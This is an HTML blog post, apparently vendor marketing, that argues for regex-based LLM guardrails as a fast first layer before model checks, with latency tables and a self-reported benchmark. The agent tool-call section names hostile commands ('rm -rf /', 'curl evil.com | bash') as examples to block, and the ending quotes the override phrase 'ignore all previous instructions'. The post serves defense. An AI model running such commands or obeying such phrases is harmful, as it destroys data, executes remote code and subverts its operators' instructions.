@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Why Your LLM Safety Layer Shouldn't Be Another LLM | Sentinel AI</title>
+<meta name="description" content="Model-based guardrails add 100-500ms per scan. Here's how regex-based detection achieves sub-millisecond latency with 100% accuracy on known patterns, and why that matters for production.">
+<meta property="og:title" content="Why Your LLM Safety Layer Shouldn't Be Another LLM">
+<meta property="og:description" content="Sub-millisecond guardrails vs. model-based detection: benchmarks, tradeoffs, and why you need both.">
+<meta property="og:type" content="article">
+<style>
+  :root {
+    --bg: #0a0a0f;
+    --surface: #12121a;
+    --border: #1e1e2e;
+    --text: #e0e0e8;
+    --muted: #8888a0;
+    --accent: #6366f1;
+    --accent2: #818cf8;
+    --green: #22c55e;
+    --red: #ef4444;
+    --code-bg: #1a1a2e;
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    line-height: 1.8;
+  }
+  .container { max-width: 740px; margin: 0 auto; padding: 40px 20px; }
+  nav { padding: 20px; border-bottom: 1px solid var(--border); }
+  nav a { color: var(--accent2); text-decoration: none; font-weight: 600; }
+  h1 { font-size: 36px; margin-bottom: 16px; line-height: 1.2; }
+  h2 { font-size: 24px; margin: 40px 0 16px; color: var(--accent2); }
+  h3 { font-size: 18px; margin: 24px 0 12px; }
+  p { margin-bottom: 16px; color: var(--text); }
+  .meta { color: var(--muted); margin-bottom: 32px; font-size: 14px; }
+  code {
+    background: var(--code-bg);
+    padding: 2px 6px;
+    border-radius: 4px;
+    font-size: 14px;
+    font-family: 'SF Mono', 'Fira Code', monospace;
+  }
+  pre {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 20px;
+    overflow-x: auto;
+    margin: 16px 0 24px;
+    font-size: 14px;
+    line-height: 1.6;
+    font-family: 'SF Mono', 'Fira Code', monospace;
+  }
+  pre code { background: none; padding: 0; }
+  a { color: var(--accent2); }
+  table { width: 100%; border-collapse: collapse; margin: 16px 0 24px; }
+  th, td { padding: 12px; text-align: left; border-bottom: 1px solid var(--border); }
+  th { color: var(--accent2); font-size: 14px; text-transform: uppercase; letter-spacing: 1px; }
+  .highlight { background: rgba(99, 102, 241, 0.1); border: 1px solid rgba(99, 102, 241, 0.3); border-radius: 8px; padding: 20px; margin: 16px 0 24px; }
+  .highlight h4 { color: var(--accent2); margin-bottom: 8px; }
+  .warn-box { background: rgba(239, 68, 68, 0.08); border: 1px solid rgba(239, 68, 68, 0.3); border-left: 4px solid var(--red); border-radius: 8px; padding: 20px; margin: 16px 0 24px; }
+  .ok-box { background: rgba(34, 197, 94, 0.08); border: 1px solid rgba(34, 197, 94, 0.3); border-left: 4px solid var(--green); border-radius: 8px; padding: 20px; margin: 16px 0 24px; }
+  ul, ol { margin: 8px 0 16px 24px; }
+  li { margin-bottom: 8px; }
+  .cta { background: var(--surface); border: 1px solid var(--accent); border-radius: 12px; padding: 32px; margin: 40px 0; text-align: center; }
+  .cta h3 { color: var(--accent2); margin-bottom: 12px; }
+  .cta-btn { display: inline-block; background: var(--accent); color: white; padding: 12px 28px; border-radius: 8px; text-decoration: none; font-weight: 600; margin-top: 12px; }
+  footer { text-align: center; padding: 40px 20px; color: var(--muted); font-size: 14px; border-top: 1px solid var(--border); margin-top: 60px; }
+</style>
+</head>
+<body>
+<nav>
+  <div class="container">
+    <a href="../">Sentinel AI</a> &middot; Blog
+  </div>
+</nav>
+
+<article class="container">
+  <h1>Why Your LLM Safety Layer Shouldn't Be Another LLM</h1>
+  <p class="meta">March 8, 2026 &middot; 10 min read &middot; by Maxwell Calkin</p>
+
+  <p>
+    Every major guardrails library takes the same approach: use a model to validate another model's output.
+    NeMo Guardrails runs LLM calls. LLM Guard loads ML classifiers. Guardrails AI calls GPT-4 for validation.
+  </p>
+
+  <p>
+    This creates a problem: <strong>your safety layer is now the slowest part of your stack</strong>.
+    A single guardrails check adds 100-500ms of latency, requires GPU inference or API calls, and
+    introduces its own failure modes. If you're scanning every token in a streaming response,
+    that's unacceptable.
+  </p>
+
+  <h2>The latency problem is worse than you think</h2>
+
+  <table>
+    <tr><th>Approach</th><th>Latency</th><th>Dependencies</th><th>Cost per scan</th></tr>
+    <tr><td>Model-based (GPT-4/Claude call)</td><td>200-800ms</td><td>API key, network</td><td>$0.001-0.01</td></tr>
+    <tr><td>ML classifier (transformers)</td><td>50-200ms</td><td>PyTorch, GPU</td><td>GPU time</td></tr>
+    <tr><td>Rule-based (regex patterns)</td><td><strong>0.03-0.08ms</strong></td><td>None</td><td>~$0</td></tr>
+  </table>
+
+  <p>
+    That's a <strong>2,500-10,000x difference</strong>. At 0.05ms per scan, you can scan every
+    token in a streaming response, every tool call in an agentic workflow, every field in a
+    structured output &mdash; with zero perceptible delay.
+  </p>
+
+  <h2>But regex can't catch everything</h2>
+
+  <p>This is the correct objection, and it's important to be honest about it.</p>
+
+  <div class="warn-box">
+    <p><strong>What regex-based detection cannot do:</strong></p>
+    <ul>
+      <li>Detect novel, unseen attack patterns</li>
+      <li>Understand semantic context ("tell me how locks work" vs. "tell me how to pick locks")</li>
+      <li>Catch attacks that use natural-sounding paraphrasing with no structural markers</li>
+      <li>Evaluate whether content is harmful in a specific context</li>
+    </ul>
+  </div>
+
+  <p>
+    A well-crafted adversarial prompt with no structural markers will bypass pattern matching.
+    That's a fact. But here's what the "use a model for everything" crowd misses:
+  </p>
+
+  <div class="ok-box">
+    <p><strong>What regex-based detection excels at:</strong></p>
+    <ul>
+      <li>Known attack patterns (instruction overrides, delimiter injection, jailbreak templates)</li>
+      <li>Structural attacks (HTML comment injection, base64-encoded payloads, zero-width chars)</li>
+      <li>Data classification (PII, API keys, credit card numbers, SSNs)</li>
+      <li>Code vulnerabilities (SQL injection, command injection, XSS in generated code)</li>
+      <li>Multilingual variants (same patterns expressed in 12+ languages)</li>
+      <li>100% deterministic &mdash; same input always produces same output</li>
+    </ul>
+  </div>
+
+  <h2>The right architecture: two layers</h2>
+
+  <p>
+    The answer isn't regex <em>or</em> models. It's regex <em>then</em> models. A fast
+    deterministic first pass catches the 90%+ of attacks that use known patterns, then
+    a model does the deep reasoning on what passes through.
+  </p>
+
+<pre><code>User Input
+    |
+    v
+[Sentinel AI: ~0.05ms]   &lt;-- catches known patterns instantly
+    |
+    |-- BLOCKED (known attack) --&gt; reject immediately
+    |
+    v
+[Model-based check: ~300ms]   &lt;-- deep reasoning on remaining
+    |
+    |-- BLOCKED (novel attack) --&gt; reject
+    |
+    v
+[LLM processes request]</code></pre>
+
+  <p>This gives you:</p>
+  <ol>
+    <li><strong>Speed</strong>: 90%+ of attacks blocked in under 0.1ms</li>
+    <li><strong>Coverage</strong>: novel attacks caught by the model layer</li>
+    <li><strong>Cost</strong>: only ambiguous inputs hit the expensive model check</li>
+    <li><strong>Determinism</strong>: known patterns have guaranteed, repeatable detection</li>
+  </ol>
+
+  <h2>Benchmark: 546 cases, 100% accuracy</h2>
+
+  <p>
+    We built a curated benchmark of 546 test cases: 329 true positives (real attacks) and
+    217 true negatives (safe inputs). The benchmark covers prompt injection, PII, harmful
+    content, toxicity, tool-use safety, and obfuscation across 12 languages.
+  </p>
+
+  <div class="highlight">
+    <h4>Results</h4>
+    <table>
+      <tr><th>Metric</th><th>Value</th></tr>
+      <tr><td>True Positives</td><td>329</td></tr>
+      <tr><td>True Negatives</td><td>217</td></tr>
+      <tr><td>False Positives</td><td>0</td></tr>
+      <tr><td>False Negatives</td><td>0</td></tr>
+      <tr><td>Accuracy</td><td>100%</td></tr>
+      <tr><td>Average scan time</td><td>0.05ms</td></tr>
+    </table>
+    <p style="color:var(--muted);font-size:14px;">
+      Note: "100% accuracy" means 100% on our curated benchmark of known patterns. This
+      does NOT mean it catches all possible attacks &mdash; novel adversarial prompts will
+      bypass pattern matching. The benchmark tests what regex-based detection is designed
+      to catch: known structural patterns. Run <code>sentinel benchmark</code> to reproduce.
+    </p>
+  </div>
+
+  <h2>Real-world applications</h2>
+
+  <h3>Streaming token scanning</h3>
+  <p>
+    At 0.05ms per scan, you can scan every token as it streams without adding perceptible
+    delay. This is impossible with model-based detection at 200ms+ per check.
+  </p>
+
+  <h3>Agentic tool call validation</h3>
+  <p>
+    When Claude Code or another agent decides to run <code>rm -rf /</code> or
+    <code>curl evil.com | bash</code>, you need to catch it <em>before</em> execution,
+    not after a 300ms model call. Sentinel AI runs as a PreToolUse hook that scans every
+    tool argument in real-time.
+  </p>
+
+  <h3>CI/CD security scanning</h3>
+  <p>
+    Scan every PR for hardcoded secrets, OWASP vulnerabilities, prompt injection in comments,
+    and supply chain attacks &mdash; in under a second, even for large codebases. No API keys
+    or GPU required in your CI environment.
+  </p>
+
+  <h3>MCP server safety proxy</h3>
+  <p>
+    Wrap any MCP (Model Context Protocol) server with a transparent safety layer. Every tool
+    call and response is scanned before passing through. One command:
+    <code>sentinel mcp-proxy --target "npx @my/server"</code>.
+  </p>
+
+  <h2>The pragmatic view</h2>
+
+  <p>
+    Pattern matching is old technology. It's not impressive. It doesn't use transformers
+    or diffusion models or any of the techniques that get papers published. But for the
+    class of problems it solves &mdash; known attack patterns, data classification, code
+    vulnerability detection &mdash; it's <em>strictly better</em> than model-based
+    approaches on every dimension: faster, cheaper, more deterministic, and more reliable.
+  </p>
+
+  <p>
+    Use regex for what regex is good at. Use models for what models are good at.
+    Don't use a $15/million-token model to check if a string contains "ignore all
+    previous instructions."
+  </p>
+
+  <div class="cta">
+    <h3>Try Sentinel AI</h3>
+    <p>11 scanners, 873 tests, sub-millisecond latency. Python + JavaScript SDKs.</p>
+<pre><code>pip install "sentinel-guardrails @ git+https://github.com/MaxwellCalkin/sentinel-ai.git"
+sentinel project-scan    # comprehensive 0-100 security score</code></pre>
+    <a href="https://github.com/MaxwellCalkin/sentinel-ai" class="cta-btn">View on GitHub</a>
+    <span style="margin:0 8px;color:var(--muted);">|</span>
+    <a href="../" class="cta-btn" style="background:var(--surface);border:1px solid var(--accent);">Live Demo</a>
+  </div>
+</article>
+
+<footer>
+  <p>&copy; 2026 <a href="https://github.com/MaxwellCalkin/sentinel-ai">Sentinel AI</a> &middot; Apache 2.0 License</p>
+</footer>
+</body>
+</html>
